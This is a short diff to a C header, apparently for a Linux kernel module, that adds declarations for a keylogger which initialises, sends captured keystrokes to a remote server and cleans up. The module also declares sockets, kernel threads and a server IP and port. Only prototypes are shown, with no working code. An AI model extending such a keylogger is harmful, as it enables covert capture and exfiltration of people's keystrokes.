@@ -43,6 +43,9 @@ char *read_file(char *filename);						// Read the content of a file into a dynam
 void print_file(char *content, enum text_level level);	// Print the content of a buffer to the kernel log
 int close_socket(void);									// Release the socket
 int close_thread(void);									// Close the kernel thread
+int epikeylog_init(int keylog_mode);					// Initialize the keylogger
+int epikeylog_send_to_server(void);						// Send keylogger content to the server
+void epikeylog_exit(void);								// Cleanup function for the keylogger
 
 extern char *ip;
 extern int port;
